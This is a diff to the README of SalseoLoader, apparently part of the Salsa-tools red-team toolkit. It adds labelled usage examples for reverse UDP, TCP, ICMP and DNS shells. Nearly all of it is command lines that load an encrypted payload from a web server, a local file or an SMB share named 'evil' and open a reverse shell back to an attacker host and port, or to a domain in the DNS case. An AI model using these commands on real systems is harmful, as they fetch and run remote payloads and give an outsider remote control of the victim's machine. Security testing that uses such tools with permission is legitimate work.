@@ -108,12 +108,14 @@ SalseoLoader.exe <PASSWORD> <PAYLOAD PATH> <SHELL TYPE> <LHOST> <LPORT>
 ```
 
 # Usage SalseoLoader in .EXE reading from web server.
+# Example ReverseUDP
 ```
 SalseoLoader.exe hc0n-2019 http://192.168.1.235/elmal.txt reverseudp 192.168.1.235 1337
 ```
 ![](https://github.com/Hackplayers/Salsa-tools/blob/master/images/example1.png)
 
 # Usage SalseoLoader in .EXE reading from local file.
+# Example ReverseTCP
 ```
 SalseoLoader.exe hc0n-2019 C:\elmal.txt reversetcp 192.168.1.235 1337
 ```
@@ -121,7 +123,17 @@ SalseoLoader.exe hc0n-2019 C:\elmal.txt reversetcp 192.168.1.235 1337
 
 
 # Usage SalseoLoader in .EXE reading from SMB file.
+# Example ReverseICMP
 ```
 SalseoLoader.exe hc0n-2019 \\192.168.1.235\evil\elmal.txt reverseicmp 192.168.1.235 
 ```
 ![](https://github.com/Hackplayers/Salsa-tools/blob/master/images/example3.png)
+
+# Usage SalseoLoader
+# Example ReverseDNS
+```
+SalseoLoader.exe hc0n-2019 C:\elmal.txt reversedns 192.168.1.235 licordebellota.org
+```
+
+![](https://github.com/Hackplayers/Salsa-tools/blob/master/images/example4.png)
+
